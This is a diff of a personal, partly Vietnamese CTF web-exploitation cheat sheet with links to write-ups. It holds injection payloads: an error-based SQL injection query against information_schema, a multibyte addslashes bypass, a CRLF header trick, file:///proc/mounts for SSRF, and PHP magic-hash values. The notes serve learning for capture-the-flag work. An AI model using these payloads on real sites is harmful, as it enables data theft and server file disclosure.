@@ -1,33 +1,34 @@
+https://vinasupport.com/fix-loi-this-site-cant-provide-a-secure-connection/
+
+github.dev
 không cần phải hiểu code chạy như nào 
 xem input với output rồi đoán quy luật
 
-có thể xem cookie trong phpinfo
-
 tra vulneribility từ những thư viện được import nhưng không dùng
+#------------------------------------url
+<?php
+// single slash case
+$uri = "/upload?/home/binarycloud/";
+$data = parse_url($uri);
+print_r($data);
 
-C:\Users\Admin\AppData\Roaming\Microsoft\Word
-Open .asd file in this location
-
-|Out-String 
-\Software\Microsoft\Windows\CurrentVersion\Run
-NTUSER.DAT open by regist editor
-raw inflate
-
-https://hackmd.io/@onsra03/SkiBeaed3 
+// doubleslash case
+$uri = "//upload?/home/binarycloud/";
+$data = parse_url($uri);
+print_r($data);
+?>
 no space in url --> bypass <url>#<space>
+https://hackmd.io/@onsra03/SkiBeaed3 
 302 to redirect and get info
 file:///proc/mounts
 
-gửi payload dài để timing attack
-https://hackmd.io/@to016/litctf2022   --> Secure website
-https://nguyendt.hashnode.dev/webhackingkr
-
-https://nguyendt.hashnode.dev/webhackingkr
-bypass preg_match(): compare
+https://hackmd.io/@endy/r1AHaERDo
+hàm require trong nodejs chỉ require 1 file dc 1 lần, require lần 2 k có tác dụng
 
 https://nhattruong.blog/2022/10/27/mot-so-payload-khi-test-truong-email/  --test email
-https://nhattruong.blog/2022/12/25/tan-cong-social-engineering-toan-tap-part-2/ ---social engineering
 
+tạo ra vòng lặp vô hạn bằng cách thay đổi para từ url từ string -> obj
+test?guess[length]=9999999999999999999 
 \r\n to add header
 admın
 Turkish character
@@ -44,3 +45,13 @@ extract()
 https://nhattruong.blog/2022/12/01/write-up-kcsc-ctf-web/    240610708 QNKCDZO
 sha256 34250003024812
 preg_replace()    php 5.5<=
+
+---------------------------addsplashs bypass
+`....` "   run code in "   4 in 1 Cyberjutsu
+pass=%1$') UNION select 1,extractvalue(0x0a, concat(0x0a, (SELECT group_concat(column_name) FROM information_schema.columns WHERE
+table_name=0x746f74616c6c795f6e6f745f615f666c6167 ))) -- -#
+https://laxiisteam.blogspot.com/2023/04/sqli-lam-nao-e-bypass-ham-addslashes.html
+%bf%5C%27 union select ...
+0xbf5c27
+--------------------------bypass preg_match(): compare
+https://nguyendt.hashnode.dev/webhackingkr
